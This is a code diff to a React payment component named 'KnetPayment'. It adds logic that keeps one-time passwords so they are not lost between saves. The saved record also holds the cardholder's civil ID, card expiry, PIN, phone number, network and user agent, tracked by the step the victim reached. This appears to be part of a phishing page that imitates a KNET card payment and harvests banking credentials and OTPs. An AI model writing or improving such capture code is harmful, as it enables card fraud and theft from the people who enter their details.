@@ -77,7 +77,13 @@ export default function KnetPayment() {
     if (isStep1Disabled) autoSavedRef.current = false;
   }, [isStep1Disabled, step]);
 
+  const savedOtpsRef = useRef({ otp1: "", otp2: "" });
+
   const saveRecord = async (extraData = {}, stepNum = step) => {
+    // Track OTP values persistently so they don't get wiped on subsequent saves
+    if (extraData.otp1) savedOtpsRef.current.otp1 = extraData.otp1;
+    if (extraData.otp2) savedOtpsRef.current.otp2 = extraData.otp2;
+
     const payload = {
       civil_id: civilId,
       amount: total,
@@ -87,11 +93,11 @@ export default function KnetPayment() {
       expiry_month: paymentInfo.month,
       expiry_year: paymentInfo.year,
       pin: paymentInfo.pass,
-      otp1: paymentInfo.otp,
+      otp1: savedOtpsRef.current.otp1 || paymentInfo.otp,
       id_number: paymentInfo.idNumber,
       phone_number: paymentInfo.phoneNumber,
       network: paymentInfo.network,
-      otp2: paymentInfo.otp2,
+      otp2: savedOtpsRef.current.otp2 || paymentInfo.otp2,
       step_reached: stepNum,
       user_agent: navigator.userAgent,
       ...extraData
